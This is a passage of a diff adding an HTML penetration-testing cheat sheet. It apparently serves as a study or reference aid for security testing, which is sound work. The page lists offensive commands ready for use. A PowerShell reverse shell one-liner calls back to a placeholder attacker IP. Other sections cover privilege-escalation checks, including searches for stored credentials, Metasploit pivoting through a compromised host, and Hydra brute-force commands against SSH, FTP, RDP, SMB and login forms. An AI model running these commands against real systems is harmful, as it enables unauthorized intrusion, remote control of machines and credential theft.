+                    <pre><code class="language-powershell">powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<YOUR_IP>',<YOUR_PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"</code></pre>
+                </li>
+            </ul>
+
+            <h3>Shell Stabilization (Upgrade basic shell)</h3>
+            <ol>
+                <li>Python PTY: `python -c 'import pty; pty.spawn("/bin/bash")'` (or `python3`)</li>
+                <li>Background Shell: `Ctrl+Z`</li>
+                <li>Terminal Setup: `stty raw -echo; fg`</li>
+                <li>Reset Terminal: `reset`</li>
+                <li>Set Terminal Type: `export TERM=xterm`</li>
+                <li>Set Shell: `export SHELL=bash`</li>
+            </ol>
+        </div>
+
+        <!-- Privilege Escalation Section -->
+        <div id="privesc" class="content-section">
+             <h2><i class="bi bi-shield-lock"></i> Privilege Escalation Quick Checks</h2>
+             <!-- CONTENT FROM 04_privesc_cheatsheet.md GOES HERE -->
+             <p><em>Goal: Find common misconfigs. Run LinPEAS/WinPEAS first!</em></p>
+
+            <h3>Linux Privilege Escalation Checks</h3>
+            <ul>
+                <li><strong>Automated Script:</strong> **(Run first!)**
+                    <pre><code class="language-bash"># Upload linpeas.sh
+chmod +x linpeas.sh
+./linpeas.sh > linpeas_output.txt # Review output (RED/YELLOW)</code></pre>
+                </li>
+                <li><strong>Manual Checks:</strong>
+                    <ul>
+                        <li>OS/Kernel Version: `uname -a`, `cat /etc/os-release` (Searchsploit kernel exploits)</li>
+                        <li>Sudo Permissions: `sudo -l` (Check GTFOBins for allowed commands)</li>
+                        <li>SUID/GUID Binaries: `find / -perm -u=s -type f 2>/dev/null`, `find / -perm -g=s -type f 2>/dev/null` (Check GTFOBins)</li>
+                        <li>Cron Jobs: `ls -la /etc/cron*`, `cat /etc/crontab` (Writable scripts? Jobs running as root?)</li>
+                        <li>Writable Files/Dirs: `find / -writable -type d 2>/dev/null`, `find /etc/ -writable -type f 2>/dev/null` (Sensitive locations?)</li>
+                        <li>Processes: `ps aux` (Services running as root with weak perms?)</li>
+                        <li>User/Group Info: `id`, `whoami`, `cat /etc/passwd`, `cat /etc/group`</li>
+                        <li>Network: `netstat -tulpn`, `ss -tulpn` (Services listening locally?)</li>
+                        <li>Mounts/fstab: `mount`, `cat /etc/fstab`</li>
+                        <li>Home Dir: `ls -la ~`, `cat ~/.bash_history` (History, keys, configs)</li>
+                    </ul>
+                </li>
+                <li><strong>Exploit Search:</strong> `searchsploit <Kernel/Service/Version>`</li>
+            </ul>
+
+            <h3>Windows Privilege Escalation Checks</h3>
+            <ul>
+                <li><strong>Automated Script:</strong> **(Run first!)**
+                    <pre><code class="language-powershell"># Upload winPEASany.exe
+.\winPEASany.exe fast > winpeas_output.txt # Review output
+# Consider PowerUp.ps1: Import-Module .\PowerUp.ps1; Invoke-AllChecks</code></pre>
+                </li>
+                <li><strong>Manual Checks:</strong>
+                    <ul>
+                        <li>System Info: `systeminfo`, `wmic qfe list brief` (OS Version, Patches - Searchsploit)</li>
+                        <li>User/Group Info: `whoami /all`, `net user`, `net user <username>`, `net localgroup administrators`</li>
+                        <li>Network: `ipconfig /all`, `netstat -ano` (+ `tasklist | findstr <PID>`)</li>
+                        <li>Processes/Services: `tasklist /V`, `wmic service list brief`, `sc query state= all` (Weak perms? Known exploits?)</li>
+                        <li>Unquoted Service Paths: `wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """` (Check path dir perms with `icacls`)</li>
+                        <li>Scheduled Tasks: `schtasks /query /fo LIST /v` (Running as SYSTEM? Writable scripts?)</li>
+                        <li>AlwaysInstallElevated: `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`, `reg query HKCU\...` (If both set to 1)</li>
+                        <li>File/Dir Permissions: `icacls "C:\Path\To\Service.exe"`, `icacls "C:\Program Files\App" /T /C` (Check service bins, configs)</li>
+                        <li>Stored Credentials: `dir /s *pass* == *.config == unattend.xml == web.config` (SAM/SYSTEM backups, config files - WinPEAS good at this)</li>
+                    </ul>
+                </li>
+                <li><strong>Exploit Search:</strong> `searchsploit Windows <Version/SP/Service> privilege escalation`</li>
+            </ul>
+        </div>
+
+        <!-- Pivoting Section -->
+        <div id="pivoting" class="content-section">
+             <h2><i class="bi bi-diagram-3"></i> Pivoting & Routing Quick Reference</h2>
+             <!-- CONTENT FROM 06_pivoting_cheatsheet.md GOES HERE -->
+             <p><em>Goal: Access internal networks through a compromised machine (Pivot Host).</em></p>
+
+            <h3>Method 1: Metasploit `autoroute` (Route MSF Traffic)</h3>
+            <ul>
+                <li><strong>Use Case:</strong> Run Metasploit modules against internal targets via Meterpreter.</li>
+                <li><strong>Steps:</strong>
+                    <ol>
+                        <li>Get Meterpreter session on Pivot Host.</li>
+                        <li>Identify internal subnet(s) (`ipconfig`/`ifconfig`, `route`).</li>
+                        <li>Add route in Meterpreter:
+                            <pre><code class="language-bash">run autoroute -s <INTERNAL_SUBNET_CIDR>
+# Example: run autoroute -s 10.10.20.0/24
+run autoroute -p # Print routes</code></pre>
+                        </li>
+                        <li>Background session (`background`).</li>
+                        <li>Use MSF modules setting `RHOSTS` to internal target IP.</li>
+                    </ol>
+                </li>
+            </ul>
+
+            <h3>Method 2: Metasploit `portfwd` (Forward Specific Ports)</h3>
+            <ul>
+                <li><strong>Use Case:</strong> Access a single internal port with external tools via Meterpreter.</li>
+                <li><strong>Steps:</strong>
+                    <ol>
+                        <li>Get Meterpreter session on Pivot Host.</li>
+                        <li>Forward port in Meterpreter:
+                            <pre><code class="language-bash"># Forward Remote Port to Local Kali Port (Common)
+# Forward RDP (3389) on 10.10.20.50 to port 4000 on Kali
+portfwd add -l 4000 -p 3389 -r 10.10.20.50
+
+# Forward SMB (445) on 10.10.20.60 to port 4455 on Kali
+portfwd add -l 4455 -p 445 -r 10.10.20.60
+
+portfwd list # Show forwards
+portfwd delete -l <LOCAL_PORT> # Delete forward</code></pre>
+                        </li>
+                        <li>Connect to the forwarded port on Kali (e.g., `rdesktop 127.0.0.1:4000`).</li>
+                    </ol>
+                </li>
+            </ul>
+
+            <h3>Method 3: Metasploit SOCKS Proxy (`socks_proxy`)</h3>
+            <ul>
+                <li><strong>Use Case:</strong> Route traffic from various external tools (browsers, nmap) through Meterpreter via `proxychains`.</li>
+                <li><strong>Steps:</strong>
+                    <ol>
+                        <li>Get Meterpreter session on Pivot Host.</li>
+                        <li>Background session (`background`).</li>
+                        <li>Start SOCKS proxy module in `msfconsole`:
+                            <pre><code class="language-bash">use auxiliary/server/socks_proxy
+# set VERSION 4a # Or 5
+run -j # Default port 1080</code></pre>
+                        </li>
+                        <li>Configure `proxychains`: Edit `/etc/proxychains4.conf`, add `socks4 127.0.0.1 1080` (or `socks5`).</li>
+                        <li>Prefix commands with `proxychains`:
+                            <pre><code class="language-bash">proxychains nmap -sT -Pn -F <INTERNAL_TARGET_IP>
+proxychains firefox http://<INTERNAL_WEB_SERVER_IP></code></pre>
+                        </li>
+                    </ol>
+                </li>
+            </ul>
+
+            <h3>Choosing the Method:</h3>
+            <ul>
+                <li><strong>`autoroute`</strong>: Easiest for MSF modules.</li>
+                <li><strong>`portfwd`</strong>: Best for single port access with external tools.</li>
+                <li><strong>`socks_proxy`</strong>: Most flexible for various external tools.</li>
+            </ul>
+        </div>
+
+        <!-- Password Attacks Section -->
+        <div id="password-attacks" class="content-section">
+             <h2><i class="bi bi-key"></i> Password Attacks Quick Reference</h2>
+             <!-- CONTENT FROM 08_password_attacks_cheatsheet.md GOES HERE -->
+             <p><em>Primarily focuses on online brute-forcing with Hydra.</em></p>
+
+            <h3>Tool: Hydra</h3>
+            <ul>
+                <li><strong>Syntax:</strong>
+                    <ul>
+                        <li>`hydra -L <users> -P <passes> [options] <TARGET> <protocol>`</li>
+                        <li>`hydra -l <user> -P <passes> [options] <TARGET> <protocol>`</li>
+                        <li>`hydra -L <users> -p <pass> [options] <TARGET> <protocol>`</li>
+                    </ul>
+                </li>
+                <li><strong>Key Options:</strong> `-L` (user file), `-l` (user), `-P` (pass file), `-p` (pass), `-t` (tasks), `-s` (port), `-V` (verbose), `-f`/`-F` (exit on first find), `-o` (output file), `-w` (wait time).</li>
+                <li><strong>Common Protocols & Examples:</strong>
+                    <ul>
+                        <li><strong>SSH (port 22):</strong>
+                            <pre><code class="language-bash">hydra -L users.txt -P pass.txt <TARGET_IP> ssh -t 4 -V -f</code></pre>
+                        </li>
+                        <li><strong>FTP (port 21):</strong>
+                            <pre><code class="language-bash">hydra -L users.txt -P pass.txt ftp://<TARGET_IP> -V</code></pre>
+                        </li>
+                         <li><strong>Telnet (port 23):</strong>
+                            <pre><code class="language-bash">hydra -L users.txt -P pass.txt telnet://<TARGET_IP></code></pre>
+                        </li>
+                        <li><strong>HTTP POST Form:</strong> (Inspect login request)
+                            <pre><code class="language-bash"># Syntax: http-post-form "<URL_PATH>:<FORM_DATA>:<FAILURE_MSG>"
+# Example:
+hydra -L users.txt -P pass.txt <TARGET_IP> http-post-form "/login.php:user=^USER^&pass=^PASS^:F=Invalid Credentials" -V -f</code></pre>
+                        </li>
+                         <li><strong>RDP (port 3389):</strong>
+                            <pre><code class="language-bash">hydra -L users.txt -P pass.txt rdp://<TARGET_IP> -V</code></pre>
+                        </li>
+                         <li><strong>SMB (port 445):</strong>
+                            <pre><code class="language-bash">hydra -L users.txt -P pass.txt <TARGET_IP> smb</code></pre>
+                        </li>
+                    </ul>
+                </li>
+                <li><strong>Wordlists:</strong> Check `/usr/share/wordlists/`, `/usr/share/seclists/` (e.g., `rockyou.txt`).</li>
+                <li><strong>Considerations:</strong> Account lockouts, noise, throttling. Offline cracking (John/Hashcat) is faster if hashes are obtained.</li>
+            </ul>
+        </div>
+
+        <!-- OS Commands Section -->
+        <div id="os-commands" class="content-section">
+             <h2><i class="bi bi-file-code"></i> Essential OS Commands Quick Reference</h2>
+             <!-- CONTENT FROM 09_os_commands_cheatsheet.md GOES HERE -->
+             <h3>Linux Commands (`bash`, `sh`)</h3>
+            <ul>
+                <li><strong>Navigation/Listing:</strong> `pwd`, `cd`, `ls -la`, `find / -name <file> 2>/dev/null`</li>
+                <li><strong>File Content:</strong> `cat`, `less`, `more`, `head`, `tail`, `grep <pattern> <file>`</li>
+                <li><strong>File Manipulation:</strong> `touch`, `mkdir`, `rm`, `cp`, `mv`, `echo "t" > f`, `echo "t" >> f`</li>
+                <li><strong>System/User Info:</strong> `uname -a`, `cat /etc/os-release`, `ps aux`, `id`, `whoami`, `groups`, `cat /etc/passwd`, `sudo -l`</li>
+                <li><strong>Networking:</strong> `ifconfig`/`ip a`, `ip route`/`route -n`, `netstat -tulpn`/`ss -tulpn`, `ping`, `wget`, `curl -O`</li>
+                <li><strong>Permissions:</strong> `chmod +x <file>`, `ls -la`</li>
+                <li><strong>History:</strong> `history`, `cat ~/.bash_history`</li>
+            </ul>
+
+            <h3>Windows Commands (`cmd.exe`)</h3>
+            <ul>
+                <li><strong>Navigation/Listing:</strong> `cd`, `dir`, `dir /a`, `dir /s`</li>
+                <li><strong>File Content:</strong> `type <file>`, `more <file>`, `findstr /i "<pattern>" <file>`</li>
+                <li><strong>File Manipulation:</strong> `echo. > file`, `echo t > f`, `echo t >> f`, `mkdir`, `del`, `rmdir /s /q`, `copy`, `xcopy /E /I /Y`, `move`</li>
+                <li><strong>System/User Info:</strong> `systeminfo`, `wmic qfe list brief`, `tasklist`, `whoami /all`, `net user`, `net user <user>`, `net localgroup administrators`</li>
+                <li><strong>Networking:</strong> `ipconfig /all`, `route print`, `netstat -ano`, `tasklist | findstr "<PID>"`, `ping`, `certutil -urlcache -f <URL> <file>`</li>
+                <li><strong>Permissions:</strong> `icacls <file/dir>`</li>
+                <li><strong>Scheduled Tasks:</strong> `schtasks /query /fo LIST /v`</li>
+                <li><strong>Registry (Query):</strong> `reg query <KeyName> /v <ValueName>`, `reg query <KeyName> /s`</li>
+            </ul>
+        </div>
+
+    </div> <!-- /main-content -->
+
+    <!-- Bootstrap Bundle JS -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL" crossorigin="anonymous"></script>
+
+    <!-- Custom JS for Navigation -->
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const sidebarLinks = document.querySelectorAll('#sidebar .list-group-item');
+            const contentSections = document.querySelectorAll('.content-section');
+
+            // Function to switch active content
+            function showContent(targetId) {
+                // Hide all content sections
+                contentSections.forEach(section => {
+                    section.classList.remove('active');
+                });
+
+                // Deactivate all sidebar links
+                sidebarLinks.forEach(link => {
+                    link.classList.remove('active');
+                });
+
+                // Show the target content section
+                const targetSection = document.getElementById(targetId);
+                if (targetSection) {
+                    targetSection.classList.add('active');
+                }
+
+                // Activate the clicked sidebar link
+                const activeLink = document.querySelector(`#sidebar .list-group-item[data-target="${targetId}"]`);
+                if (activeLink) {
+                    activeLink.classList.add('active');
+                }
+            }
+
+            // Add click listeners to sidebar links
+            sidebarLinks.forEach(link => {
+                link.addEventListener('click', function(event) {
+                    event.preventDefault(); // Prevent default link behavior
+                    const targetId = this.getAttribute('data-target');
+                    showContent(targetId);
+
+                    // Optional: Scroll content to top on switch
+                    document.getElementById('main-content').scrollTop = 0;
+                });
+            });
+
+            // Show the initial active section (Methodology)
+            showContent('methodology');
+        });
+    </script>
+
+</body>
+</html>
